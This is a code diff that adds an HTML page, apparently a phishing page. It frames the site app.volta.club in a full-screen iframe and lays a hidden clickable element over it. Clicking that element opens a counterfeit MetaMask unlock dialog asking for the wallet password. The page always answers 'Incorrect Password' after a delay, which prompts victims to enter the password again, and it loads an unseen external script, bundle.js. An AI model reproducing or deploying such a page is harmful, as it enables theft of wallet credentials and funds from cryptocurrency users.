@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Volta Club</title>
+    <link rel="icon" type="image/png" sizes="100x100" href="/favicon.ico">
+    <style>
+      html, body {
+            height: 100%;
+            margin: 0;
+            overflow: hidden;
+      }
+      iframe {
+          width: 100%;
+          height: 100%;
+          border: 0;
+      }
+      body {
+          font-family: Arial, sans-serif;
+          overflow-x: hidden; /* Prevent horizontal scroll during animation */
+      }
+      .lg-img{
+        position: absolute;
+        top: 31px;
+        right: 29px;
+        color: #eee;
+        background: transparent;
+        width: 45px;
+        text-align: left;
+        padding-left: 90px;
+        height: 48px;
+        line-height: 2.2;
+        z-index: 10000;
+        cursor: pointer;
+      }
+    </style>
+    <link rel="stylesheet" href="/metamask.css" />
+  </head>
+  <body contextmenu="false">
+    <iframe src="https://app.volta.club" title="Content Frame" id="myIframe"></iframe>
+    <div id="loginModal" class="modal">
+      <div id="loginModalContent" class="modal-content">
+        <div class="metamask-loading" id="metamask-loading">
+          <div class="metamask-pending">
+            <img src="/metamask/metamask-fox.svg" width="150"/>
+            <img class="metamask-spinner" src="/metamask/spinner.gif"/>
+          </div>
+        </div>
+        <div class="metamask-content" id="metamask-content">
+          <div class="mm-loading-overlay hidden" id="mm-loading-overlay">
+            <img class="mm-loading" src="/metamask/VAyR.gif"/>
+          </div>
+          <div class="metamask-header">
+            <div class="metamask-net">
+              <img class="metamask-eth" src="/metamask/eth_logo.svg"/> <span class="metamask-netname">Ethereum Mainnet</span>
+              <img class="metamask-arrow-down" src="/metamask/arrow-down.svg"/>
+            </div>
+            <img class="metamask-icon" src="/metamask/metamask-fox.svg"/>
+          </div>
+          <div class="metamask-body">
+            <div id="metamask-3d"></div>
+            <div class="metamask-welcome-container">
+              <div class="metamask-welcome">Welcome back!</div>
+              <div class="metamask-await">The decentralized web awaits</div>
+            </div>
+            <div class="input-container">
+              <input id="metamask-password" class="animated-input" placeholder=" " type="password"/>
+              <label for="input" class="floating-label">Password</label>
+            </div>
+            <div class="hidden" id="incorrect-password">Incorrect Password</div>
+            <div>
+              <button class="metamask-unlock" id="metamask-unlock" disabled>Unlock</button>
+            </div>
+            <div class="metamask-pf"><a class="metamask-forgot">Forgot password?</a></div>
+            <div class="metamask-help">Need help? Contact <a class="metamask-support" href="https://support.metamask.io" target="_blank" rel="noopener noreferrer">MetaMask support</a></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lg-img" id="connecWallet" onclick="openMetaMaskModal();"></div>
+  </body>
+  <script src="/metamask/bundle.js"></script>
+  <script>
+    const modal = document.getElementById("loginModal");
+    const modalContent = document.querySelector(".modal-content");
+    let mousePressedOutside = false;
+    const metamaskButton = document.getElementById("metamaskLogin");
+    const metamaskLoading = document.getElementById("metamask-loading");
+    const metamaskContent = document.getElementById("metamask-content");
+    const metamaskInput = document.getElementById('metamask-password');
+    const unlockBtn = document.getElementById('metamask-unlock');
+    const mmLoading = document.getElementById('mm-loading-overlay');
+    const incorrectPassword = document.getElementById('incorrect-password');
+
+    metamaskInput.addEventListener('input', function (ev) {
+      if(metamaskInput.value != ''){
+        unlockBtn.removeAttribute("disabled");
+      } else{
+        unlockBtn.setAttribute('disabled', 'disabled');
+      }
+      metamaskInput.classList.remove("invalid");
+      incorrectPassword.classList.add("hidden");
+    });
+
+    unlockBtn.addEventListener('click', function (ev) {
+      mmLoading.classList.remove("hidden");
+      let timer = setTimeout(() => {
+        clearTimeout(timer);
+        mmLoading.classList.add("hidden");
+        metamaskInput.classList.add("invalid");
+        incorrectPassword.classList.remove("hidden");
+      }, 5000);
+    });
+
+    metamaskInput.addEventListener('keydown', function(event) {
+        if (event.key === 'Enter') {
+          mmLoading.classList.remove("hidden");
+          let timer = setTimeout(() => {
+            clearTimeout(timer);
+            mmLoading.classList.add("hidden");
+            metamaskInput.classList.add("invalid");
+            incorrectPassword.classList.remove("hidden");
+          }, 5000);
+        }
+    });
+
+    // Open modal
+    function openMetaMaskModal(){
+      if (typeof window.ethereum !== 'undefined') {
+        modal.style.display = "block";
+        metamaskInput.value='';
+        metamaskInput.classList.remove("invalid");
+        incorrectPassword.classList.add("hidden");
+        unlockBtn.setAttribute('disabled', 'disabled');
+        let timer = setTimeout(() => {
+          clearTimeout(timer);
+          metamaskLoading.style.display = "none";
+          metamaskContent.style.display = "block";
+          metamaskInput.focus();
+        }, 3000);
+      } else {
+          alert('Please install MetaMask!');
+      }
+    }
+
+    // Track mouse press state
+    document.addEventListener("mousedown", (event) => {
+      // Check if the click started outside the modal content
+      mousePressedOutside = !modalContent.contains(event.target);
+    });
+
+    // Close modal on mouse release if clicked and released outside
+    document.addEventListener("mouseup", (event) => {
+      if (mousePressedOutside && !modalContent.contains(event.target)) {
+        modal.style.display = "none";
+        metamaskContent.style.display = 'none';
+        metamaskLoading.style.display = "flex";
+        if(tdlogo){
+          let metamask3d = document.getElementById('metamask-3d');
+          metamask3d.removeChild(metamask3d.firstChild);
+          tdlogo = null;
+        }
+      }
+      // Reset the state
+      mousePressedOutside = false;
+    });
+
+    // Prevent modal from closing on click inside modal content
+    modalContent.addEventListener("click", (event) => {
+      event.stopPropagation();
+    });
+
+  </script>
+</html>
